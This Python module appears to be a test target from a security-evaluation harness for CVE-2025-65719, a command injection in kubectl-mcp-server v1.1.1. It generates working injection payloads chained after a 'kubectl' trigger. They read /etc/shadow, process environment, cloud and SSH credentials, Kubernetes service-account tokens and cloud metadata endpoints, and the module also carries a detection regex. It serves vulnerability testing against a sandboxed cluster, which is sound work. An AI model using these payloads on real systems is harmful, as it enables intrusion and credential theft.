"""CVE-2025-65719: kubectl-mcp-server command injection (CWE-94, command execution).

kubectl-mcp-server v1.1.1's minimal_wrapper runs process_natural_language's query through
`subprocess.run(command, shell=True)` when the query begins with `kubectl `, so a shell
metacharacter in the argument runs a command of the caller's choice and its stdout returns in the
tool response. v1.2.0 requires a `query` argument, parses with `shlex.split` and runs
`shell=False`, neutralising the injection.

Every exploit prefixes the kubectl trigger, then chains a command after `;`: `kubectl version
--client` exits first, then the injected reader runs. One dedicated exploit per kept place names
the location it reads. The slim image carries no curl, so the HTTP-endpoint readers use python3.

The benign call runs process_natural_language('get pods'), which the server translates to
`kubectl get pods`. kubectl is the real software the server shells out to, so it reaches a real
Kubernetes control plane (`evals.cve.backends.kubernetes`): upstream v1.37.2, stood for each launch
in its own network namespace on a closed network the namespace holder joins, never in the holder,
whose loopback carries the link-local sentinels. kubeadm generates its certificates and its
`admin.conf` per launch, and the builder mounts that kubeconfig read-only at kubectl's default path
(`/tmp/.kube/config`, under `HOME=/tmp`), naming the API server by address. The cluster has no node,
so the benign call returns an empty pod list for the default namespace with no error.
"""

import json
import re
from collections.abc import Awaitable, Callable
from pathlib import Path

from evals.cve.backends import backend_beside_launch, kubernetes, kubernetes_detection
from evals.cve.backends.kubernetes import CONTROL_PLANE_SERVICE
from evals.cve.backends.kubernetes_detection import kubernetes_injection_env
from evals.cve.detection.targets import Target
from evals.cve.grammar import FlawClass
from evals.cve.layout import PROJECT
from evals.cve.places import Place, PlaceKind, Places
from evals.cve.planting import PlantingHost, SymbolicUser
from evals.cve.planting_spec import resolve_container_path
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2025-65719-kubectl"
PATCHED = "holdout-2025-65719-kubectl-patched"
WORKING_DIRECTORY = PROJECT  # /srv/app, the checkout; the flaw runs through the server's own shell
TOOL = "process_natural_language"
# The vulnerable branch fires only when the query begins with "kubectl "; the trigger exits with
# --client, then `;` chains the reader. The benign username (a plain query) carries no `;`.
TRIGGER = "kubectl version --client ; "

AIM = re.compile(r";\s*(?:cat|id|uname|python3)\b")

KEPT_PLACES = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "proc-environ",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _cmd_for(place: Place) -> str:
    kind = place.kind
    if kind is PlaceKind.FILE:
        coords = place.coordinates
        paths = coords.paths if coords.paths is not None else (coords.path,)
        resolved = " ".join(
            resolve_container_path(p, WORKING_DIRECTORY) for p in paths if p is not None
        )
        return f"cat {resolved}"
    if kind is PlaceKind.ENV:
        return "cat /proc/self/environ"
    if kind is PlaceKind.ACCOUNT:
        return "id"
    if kind is PlaceKind.HOSTNAME:
        return "uname -n"
    if kind is PlaceKind.HTTP_ENDPOINT:
        url = f"http://{place.coordinates.host}{place.coordinates.path}"
        read = f"urllib.request.urlopen('{url}',timeout=5).read().decode()"
        return f'python3 -c "import urllib.request;print({read})"'
    raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        payload = TRIGGER + _cmd_for(places[place_id])
        await client.call_tool(TOOL, {"args": json.dumps([payload]), "kwargs": "{}"})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # process_natural_language('get pods') -> `kubectl get pods` against the launch's control
    # plane, which has no pod in the default namespace. `query` is required on v1.2.0.
    await client.call_tool(
        TOOL, {"args": json.dumps(["get pods"]), "kwargs": "{}", "query": "get pods"}
    )


TARGET = Target(
    flaw_id="CVE-2025-65719",
    severity="CVSS 9.8 (v3.1, GHSA-94gr-w3q5-rfqr)",
    classes=frozenset({FlawClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "sentinel", CONTROL_PLANE_SERVICE),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        SymbolicUser.UNPRIVILEGED,
        WORKING_DIRECTORY,
        has_network=True,
    ),
    builder=kubernetes_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Command injection (CWE-94): process_natural_language passes a query beginning with "
        "`kubectl ` to subprocess.run with shell=True, so a shell metacharacter in the argument "
        "executes an arbitrary command in the server's container."
    ),
    tools_filter=None,
    backend_sources=(
        Path(kubernetes.__file__),
        Path(kubernetes_detection.__file__),
        Path(backend_beside_launch.__file__),
    ),
)
